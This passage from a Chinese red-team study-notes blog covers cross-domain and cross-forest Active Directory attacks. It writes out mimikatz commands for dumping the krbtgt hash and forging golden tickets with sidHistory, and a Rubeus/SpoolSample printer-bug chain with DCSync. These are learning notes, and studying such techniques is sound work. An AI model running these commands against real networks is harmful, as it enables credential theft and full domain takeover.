<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110211307519.png"></p>
<h2 id="3、利用-krbtgt-散列值获取目标域的权限"><a href="#3、利用-krbtgt-散列值获取目标域的权限" class="headerlink" title="3、利用 krbtgt 散列值获取目标域的权限"></a>3、利用 krbtgt 散列值获取目标域的权限</h2><p>如果攻击者获取了林内任意域的 krbtgt 散列值，就可以使用 sidHistory 获得该林的完整权限。</p>
<p>首先获取当前子域和父域的 SID 值，可以使用以下工具或命令</p>
<pre class="line-numbers language-none"><code class="language-none">wmic useraccount get caption,sidwhoami &#x2F;useradfind.exe -sc u:user4 | findstr SidGet-DomainSID sub.teamssix.com  # PowerView 里的命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>接下来获取子域的 krbtgt 的哈希值，使用 mimikatz 即可</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:krbtgt&quot; sekurlsa::krbtgt exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在子域普通用户权限的计算机中构造黄金票据</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;krbtgt:b53a5c7c51648f033b96971e7ae4ee45 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110211315739.png"></p>
<h2 id="4、利用无约束委派和-MS-RPRN-获取信任林权限"><a href="#4、利用无约束委派和-MS-RPRN-获取信任林权限" class="headerlink" title="4、利用无约束委派和 MS-RPRN 获取信任林权限"></a>4、利用无约束委派和 MS-RPRN 获取信任林权限</h2><p>如果已经获取了域林中某个域控权限，或者配置了无约束委派的任何服务器的权限，那么就可以使用 MS RPRN 的 RpcRemoteFindPrinterChangeNotification(Ex) 方法，使信任林的域控制器向已被控制的服务器发送身份认证请求，利用捕获的票据获取信任林内任意用户的哈希值。</p>
<p>假设这里获取了 teamssix.com 域的域控权限，且 0day.org 与 teamssix.com 域有林信任关系</p>
<p>首先在 teamssix.com 的域控上监听身份认证请求</p>
<pre class="line-numbers language-none"><code class="language-none">rubeus.exe monitor &#x2F;interval:5 &#x2F;filteruser:OWA2010SP3$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">interval: 用于设置监控的时间间隔filteruser: 用于指定需要关注的主机，这里的 OWA2010SP3 是 0day.org 域控的主机名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>开启监听后，使用 SpoolSample 工具让 OWA2010SP3.0day.org 向 dc.teamssix.com 发送身份认证请求</p>
<pre class="line-numbers language-none"><code class="language-none">SpoolSample.exe OWA2010SP3.0day.org dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>获得票据后，使用 rubeus 将票据注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">rubeus.exe ptt &#x2F;ticket:&lt;TGT 票据&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 mimikatz 获取目标的 krbtgt 散列值</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::dcsync &#x2F;domain:0day.org &#x2F;user:0day\krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>接下来，构造黄金票据并将其注入内存，就能够获得 0day.org 域控的权限了</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz &quot;Kerberos::golden &#x2F;user:Administrator &#x2F;domain:0day.org &#x2F;sid:5-1-5-21-1812920812-2335051732-3517558806 &#x2F;rc4:b53a5c8c51648f053b96971e7ae4ee25 &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="0x31-后记"><a href="#0x31-后记" class="headerlink" title="0x31 后记"></a>0x31 后记</h1><p>自 2021年 2 月 3 日发布内网学习笔记第一节笔记开始，已经过去了大半年的时间，虽然是 2021 年 2 月 3 号发布文章，但实际上早在 2020 年的 10 月份就已经开始购入《内网安全攻防》这本书，并打算开始学习内网了，这样算下来到今年的 10 月份，正好一年的时间，这一年来发现真的是越学越感觉自己所掌握的知识太少，而自己只不过刚刚接触了点皮毛而已，这门艺术又是如此的迷人，吸引着自己不断去学习、探索。</p>
<p>在此感谢 MS 08067 实验室里的徐焱、贾晓璐所编写的《内网安全攻防》，感谢每篇笔记最后参考链接的作者们，感谢曾经帮助我解决所碰到问题的大佬们，正是有你们这些前人才使得我们后人有了学习的方向以及参考，谢谢你们。</p>
<blockquote>
<p>最后，还有一点要注意的就是， 内网学习笔记系列只是我个人在学习内网的过程中所做的笔记，建议不要当做教程看，因为其中我本身已经知道的知识点和感觉不重要知识点我是没有记录的。</p>
<p>将自己的笔记公开发出来的目的有二：一是便于自己遗忘时随时查找，这也是17年我建立这个公众号的主要目的；二是在笔记中我会记录一些坑的解决方法，如果你碰到和我一样的问题，或许我这小菜鸟写的笔记就能帮助到你。</p>
</blockquote>
<p>希望我的这一点学习笔记，也能帮助到想要学习内网的后人们。</p>
<blockquote>
<p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
<p>原文链接：<a href="https://www.teamssix.com/211027-163641.html">https://www.teamssix.com/211027-163641.html</a></p>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4008">https://xz.aliyun.com/t/4008</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7311">https://xz.aliyun.com/t/7311</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7875">https://xz.aliyun.com/t/7875</a><br><a target="_blank" rel="noopener" href="https://bipy.me/post/crack-rar/">https://bipy.me/post/crack-rar/</a><br><a target="_blank" rel="noopener" href="https://ehang-io.github.io/nps/">https://ehang-io.github.io/nps/</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/DMZ">https://baike.baidu.com/item/DMZ</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/AGDLP">https://baike.baidu.com/item/AGDLP</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/23a4e8978a30">https://www.jianshu.com/p/23a4e8978a30</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/27730ab4a6db">https://www.jianshu.com/p/27730ab4a6db</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/331aa59fff5d">https://www.jianshu.com/p/331aa59fff5d</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a210528f9b35">https://www.jianshu.com/p/a210528f9b35</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c8f5c374466a">https://www.jianshu.com/p/c8f5c374466a</a><br><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2019/10/nc.html">https://www.sqlsec.com/2019/10/nc.html</a><br><a target="_blank" rel="noopener" href="https://evi1cg.me/archives/Powerup.html">https://evi1cg.me/archives/Powerup.html</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184855">https://www.anquanke.com/post/id/184855</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/NTLM/6371298">https://baike.baidu.com/item/NTLM/6371298</a><br><a target="_blank" rel="noopener" href="https://www.hi-linux.com/posts/61543.html">https://www.hi-linux.com/posts/61543.html</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/LLMNR/1116392">https://baike.baidu.com/item/LLMNR/1116392</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/158393.html">https://www.freebuf.com/sectool/158393.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/179002.html">https://www.freebuf.com/sectool/179002.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/210450.html">https://www.freebuf.com/sectool/210450.html</a><br><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2019/10/hashcat.html">https://www.sqlsec.com/2019/10/hashcat.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/246440.html">https://www.freebuf.com/articles/246440.html</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Windows%E5%9F%9F">https://baike.baidu.com/item/Windows%E5%9F%9F</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lfoder/p/8241548.html">https://www.cnblogs.com/lfoder/p/8241548.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/13216686.html">https://www.cnblogs.com/Xy–1/p/13216686.html</a><br><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Active_Directory">https://zh.wikipedia.org/wiki/Active_Directory</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97">https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91">https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/micr067/p/12263337.html">https://www.cnblogs.com/micr067/p/12263337.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/micr067/p/12307519.html">https://www.cnblogs.com/micr067/p/12307519.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/11707302.html">https://www.cnblogs.com/zpchcbd/p/11707302.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/frendguo/p/11761693.html">https://www.cnblogs.com/frendguo/p/11761693.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/websecyw/p/11835830.html">https://www.cnblogs.com/websecyw/p/11835830.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/251389.html">https://www.freebuf.com/articles/web/251389.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/274035.html">https://www.freebuf.com/articles/web/274035.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/280406.html">https://www.freebuf.com/articles/web/280406.html</a><br><a target="_blank" rel="noopener" href="https://y4er.com/post/kerberos-kerberoasting-spn">https://y4er.com/post/kerberos-kerberoasting-spn</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lavender000/p/6931405.html">https://www.cnblogs.com/lavender000/p/6931405.html</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1043370">https://cloud.tencent.com/developer/article/1043370</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1170758">https://cloud.tencent.com/developer/article/1170758</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1752145">https://cloud.tencent.com/developer/article/1752145</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1752180">https://cloud.tencent.com/developer/article/1752180</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1752212">https://cloud.tencent.com/developer/article/1752212</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1760135">https://cloud.tencent.com/developer/article/1760135</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1772183">https://cloud.tencent.com/developer/article/1772183</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/114731.html">https://www.freebuf.com/articles/system/114731.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/194549.html">https://www.freebuf.com/articles/system/194549.html</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Windows%20Power%20Shell">https://baike.baidu.com/item/Windows%20Power%20Shell</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/261454.html">https://www.freebuf.com/articles/network/261454.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/henter/article/details/80079531">https://blog.csdn.net/henter/article/details/80079531</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/coderge/articles/13768824.html">https://www.cnblogs.com/coderge/articles/13768824.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/nathan8/article/details/108804056">https://blog.csdn.net/nathan8/article/details/108804056</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84">https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/wulantian/article/details/42418231">https://blog.csdn.net/wulantian/article/details/42418231</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/bring_coco/article/details/113550173">https://blog.csdn.net/bring_coco/article/details/113550173</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32393893/article/details/108904697">https://blog.csdn.net/qq_32393893/article/details/108904697</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34640691/article/details/111881910">https://blog.csdn.net/qq_34640691/article/details/111881910</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36279445/article/details/110647055">https://blog.csdn.net/qq_36279445/article/details/110647055</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45742511/article/details/117301437">https://blog.csdn.net/qq_45742511/article/details/117301437</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE/8938996">https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE/8938996</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44064908/article/details/103920329">https://blog.csdn.net/weixin_44064908/article/details/103920329</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45116657/article/details/103449931">https://blog.csdn.net/weixin_45116657/article/details/103449931</a><br><a target="_blank" rel="noopener" href="https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/">https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95">https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95</a><br><a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a><br><a target="_blank" rel="noopener" href="https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/">https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/</a><br><a target="_blank" rel="noopener" href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a><br><a target="_blank" rel="noopener" href="https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/</a><br><a target="_blank" rel="noopener" href="https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/">https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/</a></p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://www.teamssix.com" rel="external nofollow noreferrer">TeamsSix</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://www.teamssix.com/211027-163641.html">https://www.teamssix.com/211027-163641.html</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://www.teamssix.com" target="_blank">TeamsSix</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E7%BA%A2%E9%98%9F/">
                                    <span class="chip bg-color">红队</span>
                                </a>
                            
                                <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                                    <span class="chip bg-color">学习笔记</span>
                                </a>
                            
                                <a href="/tags/%E5%86%85%E7%BD%91/">
                                    <span class="chip bg-color">内网</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: 'c8a95bd73658f8325d81',
        clientSecret: '2c42daedb7d6444b7482e31b76c818cfc99854f0',
        repo: 'Gitalk',
        owner: 'teamssix',
        admin: "teamssix",
        id: '2021-10-27T16-36-41',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/211028-204606.html">
                    <div class="card-image">
                        
                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110282041924.png" class="responsive-img" alt="【经验总结】Docker 使用笔记">
                        
                        <span class="card-title">【经验总结】Docker 使用笔记</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-28
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="post-category">
                                    经验总结
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
                        <span class="chip bg-color">经验总结</span>
                    </a>
                    
                    <a href="/tags/Docker/">
                        <span class="chip bg-color">Docker</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/211022-122217.html">
                    <div class="card-image">
                        
                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091330529.png" class="responsive-img" alt="【内网学习笔记】30、跨域安全（完结）">
                        
                        <span class="card-title">【内网学习笔记】30、跨域安全（完结）</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-22
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
                                    内网学习笔记
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
                        <span class="chip bg-color">红队</span>
                    </a>
                    
                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                        <span class="chip bg-color">学习笔记</span>
                    </a>
                    
                    <a href="/tags/%E5%86%85%E7%BD%91/">
                        <span class="chip bg-color">内网</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: TeamsSix<br />'
            + '文章作者: TeamsSix<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('2'),
            headingSelector: 'h1, h2'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
                <span id="year">2017</span>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">253.8k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2017";
                    var startMonth = "12";
                    var startDate = "19";
                    var startHour = "7";
                    var startMinute = "7";
                    var startSecond = "7";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/teamssix" class="tooltipped" target="_blank" data-tooltip="访问我的 GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="https://wiki.teamssix.com/" class="tooltipped" target="_blank" data-tooltip="访问 T Wiki 云安全知识文库" data-position="top" data-delay="50">
        <i class="fab fa-wikipedia-w"></i>
    </a>







    <a href="https://twitter.com/TeamsSix" class="tooltipped" target="_blank" data-tooltip="关注我的 Twitter" data-position="top" data-delay="50">
        <i class="fab fa-twitter"></i>
    </a>






    <a href="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" class="tooltipped" target="_blank" data-tooltip="关注我的微信公众号" data-position="top" data-delay="50">
        <i class="fab fa-weixin"></i>
    </a>



    <a href="https://blog.csdn.net/qq_37683287" class="tooltipped" target="_blank" data-tooltip="访问我的 CSDN" data-position="top" data-delay="50">
